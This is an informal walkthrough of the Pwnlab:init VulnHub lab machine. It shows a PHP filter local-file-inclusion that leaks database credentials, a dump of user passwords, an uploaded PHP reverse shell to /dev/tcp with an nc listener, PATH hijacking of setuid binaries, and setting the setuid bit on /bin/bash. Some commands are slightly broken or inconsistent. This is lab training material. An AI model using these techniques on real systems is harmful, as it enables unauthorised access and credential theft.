


# Pwnlab:init Walkthrough 

**VulnHub Link:** [Pwnlab:init](https://www.vulnhub.com/entry/pwnlab-init,158/)
**Difficulty:** Easy
**Release Date:** 1 Aug 2016

## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.176
```


## 2.Web Enumeration

```bash
dirb http://192.168.100.176
```

we found out that we can filter from url

we add this after ?/ --->

php://filter/convert.base64-encode/resource=config

```bash
echo "encoded" | base64 -d
```

<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>



```bash
mysql -h 192.168.100.176 -u root -p
```
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+

we decoded kent password and logged in web page

```php
<?php
    echo "<pre>";
    echo "bash -c 'bash -i >& /dev/tcp/192.168.100.176/1234 0>&1';
    echo "</pre>";
?>
```

in another page , we changed it phpsessionid to lang=../upload/<your id>

another webpage http://192.168.100.176/?page=php://filter/convert.base64-encode/resource=index

dont forget 
```bash
rlwrap nc -nvlp 1234
```

www-data shell opened and then found out that kane user's decoded password is his password in machine
```bash
echo "/bin/bash" > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH
./msgmike
```

## 3.Privilege Escalation

we got mike shell
```bash
./msg2root
chmod u+s /bin/bash
```

now /bin/bash has suid byte

but we cant read flag.txt from /root

```bash
python -m SimpleHTTPServer 8080
(in our machine)
wget http://192.168.100.176/flag.txt
```
